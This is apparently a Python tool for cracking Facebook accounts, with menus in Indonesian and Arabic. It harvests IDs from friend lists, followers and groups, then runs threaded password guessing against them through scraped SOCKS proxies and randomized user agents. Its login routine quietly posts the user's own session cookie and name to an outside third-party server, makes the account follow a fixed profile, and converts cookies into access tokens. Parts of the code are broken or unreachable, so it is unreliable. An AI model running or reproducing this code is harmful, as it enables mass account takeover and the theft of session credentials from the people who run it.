'''
   ÿ£   ÿ®   ÿ±   ÿ£   ŸÉ   ÿ£   ÿØ   ÿ£   ÿ®   ÿ±   ÿ£
ÿ£   |   \\ ÿ® |   |   \\ ÿ± |   |   \\ ÿ£ |   |   \\ ŸÉ |
 |    \\ /  |   |    \\ /  |   |    \\ /  |   |    \\ /
ÿ£---ÿ±   ÿ®   ÿ£---ŸÉ   ÿ£---ÿ£   ÿ£---ÿØ   ÿ£---ÿ£   ÿ®---ÿ±   ÿ£

'''
import os
import sys
import time
import requests
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
###----------[ WARNA PRINT RICH ]---------- ###
import socket
import sys
import time    
# iphane = socket.gethostname()
# ipp = socket.gethostbyname(iphane)
# url = requests.get('https://pastebin.com/20tbfqKL').text
# if ipp in url:
    # os.system('clear') 
# else:
   # now = datetime.datetime.today()
# now = datetime.datetime.today()
# mm = str(now.month)
# dd = str(now.day)
# yyyy = str(now.year)
# hour = str(now.hour)
# mi = str(now.minute)
# ss = str(now.second)
# t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
# hours = now.hour
# x = datetime.datetime.now()
# g = datetime.datetime(2023, 9, 29, 12, 3, 0)
# if x.strftime('%x') > g.strftime('%x'):
    # print('\n\n')
    # print("     "+'   ÿßŸÜÿ™Ÿá ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿ±ÿßÿ≥ŸÑ ÿßŸÑŸÖÿ∑Ÿàÿ± ŸÑŸÑÿ≠ÿµŸàŸÑ ÿπŸÑÿß ÿßÿ¥ÿ™ÿ±ŸÑŸÉ ÿ¨ÿØŸäÿØ @H_S_W_Müòà' )
    # print('\n\n')
    # print(x)
    # sys.exit(0)
# if x.strftime('%x') == g.strftime('%x'):
    # print('')
    # if x.strftime('%X') > g.strftime('%X'):
        # print('\n\n')
        # print("     "+'   ÿßŸÜÿ™Ÿá ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿ±ÿßÿ≥ŸÑ ÿßŸÑŸÖÿ∑Ÿàÿ± ŸÑŸÑÿ≠ÿµŸàŸÑ ÿπŸÑÿß ÿßÿ¥ÿ™ÿ±ŸÑŸÉ ÿ¨ÿØŸäÿØ @H_S_W_Müòà' )
        # print('\n\n')
        # print(x)
try:
        
        import rich
except ImportError:
        cetak(nel('\t‚Ä¢ Sedang Menginstall Modul Rich ‚Ä¢'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t‚Ä¢ Sedang Menginstall Modul Stdiomask ‚Ä¢'))
        os.system('pip install stdiomask')
try:
	
	import requests
except ImportError:
 Z = '\x1b[1;96m'
R = '\x1b[1;97m'
X = '\x1b[1;91m'
F = '\033[93m' # KUNING +
C = '\x1b[0;34m' # BIRU +
B = '\033[2;36m'
Y = '\033[1;34m'
E = '\033[1;31m'
B ='\x1b[1;91m' #RED +
G = '\033[1;32m'
S = '\033[1;33m'
print('\n')
token=input(B+' ANTR- token : '+F)
print('\n')
ID=input(B+' ANTR-  ID    : '+F)
os.system('clear')
cetak(nel('\t‚ôï BXE-ŸÑŸÑÿßÿ≥ÿ™ŸÖÿ±ÿßÿ± ÿßŸÜÿ™ÿ∂ÿ± ÿßÿØÿßÿ™ ÿµŸäÿØ ÿ®ÿ®ÿ¨Ÿä ŸÖÿ∑Ÿàÿ±‚ôï'))
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#00C8FF"
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
	###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
    dua  = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
    tiga  = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
    empat  = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
    lima  = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2}ŸÑÿßÿ™ŸàŸÅÿ± ÿßÿ™ÿµÿßŸÑ ÿ®ÿßŸÑÿßŸÜÿ™ÿ±ŸÜÿ™ ÿ≠ÿßŸàŸÑ ŸÖÿ±Ÿá ÿßÿÆÿ±ÿ¶",width=80,padding=(0,2),style=f"{color_panel}"));exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek



class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.menu()

    def hapus(self):
        try:os.remove("ok.coki.txt");os.remove(".ID.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        

    def login_cokie(self):
        self.logoo()
        print('')
        print('')
        try:
            cok = input("[<>] cookie >> ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[<>] notice: anda sedang menggunakan mode free facebook")
                print("[<>] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                self.ubah_bahasa({"cookie": cok})
                exit("\n[‚úì] proses mengubah ke mode data telah selesai.\n[<>] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("[‚úò] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[‚úò] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            else:
                print("\n[<>] wait a little bit...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('ok.coki.txt', 'w').write(cok);open('ID.txt', 'w').write(f"{nama}|{user}")
                print(f"[<>] Hi :  {nama} ");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!!]")
        except requests.ConnectionError:
            print('')
            exit("\n[‚àö] ÿ™ŸÖ ÿ™ŸÜÿ¥Ÿäÿ∑ ÿßŸÑŸÉŸàŸÉŸäÿ≤ ÿ®ŸÜÿ¨ÿßÿ≠")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0" })
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(‚úì) File save in proxies.txt, restart this tools\n")
        else:
            exit("(‚úì) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open("ok.coki.txt", "r").read()}
            nama, user = open("ID.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[!!] It seems that the Facebook account has been locked. Please verify the account or create a new cookie.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[‚àö] ÿ™ŸÖ ÿ™ŸÜÿ¥Ÿäÿ∑ ÿßŸÑŸÉŸàŸÉŸäÿ≤ ÿ®ŸÜÿ¨ÿßÿ≠")
        self.jnckk()
        os.system('clear')
        llogin()
        def fak_xy(u):
        	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
        def clear():
        	os.system('clear')
        	def back():
        		llogin()
        	def banner():
        		print(f'''BXE''')
        exit()
        


        ykh = input(f"{H}[{M}+{H}]{N} BXE  ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} BXE> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} BXE_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}√ó{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}√ó{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""---------------
BXE                    
------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""--------------
   BXE                 
---------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-------------
BXE
-----------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
        
        os.system('clear')
        llogin()		
		
def clear():
	os.system('clear')
def back():
	login()
	
def none():
	clear()
	
def info():
	print('')                       
def banner():
	print(f'{F}<< @H_S_W_M {Z}8&&8  {F}@H_S_W_M>>')
	print(('‚Äî'*25)+'\n‚Ä¢ DeCoDe By @H_S_W_M ‚Ä¢\n'+('‚Äî'*25))
	
def llogin():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
			
			
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		banner()
		
		asu = random.choice([m,k,h,b,u])
		print('')
		print('')
		your_cookies = input(f'[{h}={x}] M[ŸÑŸÑÿßÿ≥ÿ™ŸÖÿ±ÿßÿ± ÿ≠ÿ∑ ŸÉŸàŸÉŸäÿ≤ ŸÖÿ±Ÿá ÿßÿÆÿ±ÿ¶/ Cookies :{asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print('')
					print(f'%s[%sx%s]%sInvalid cookie [NO]%s'%(x,k,x,m,x))
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
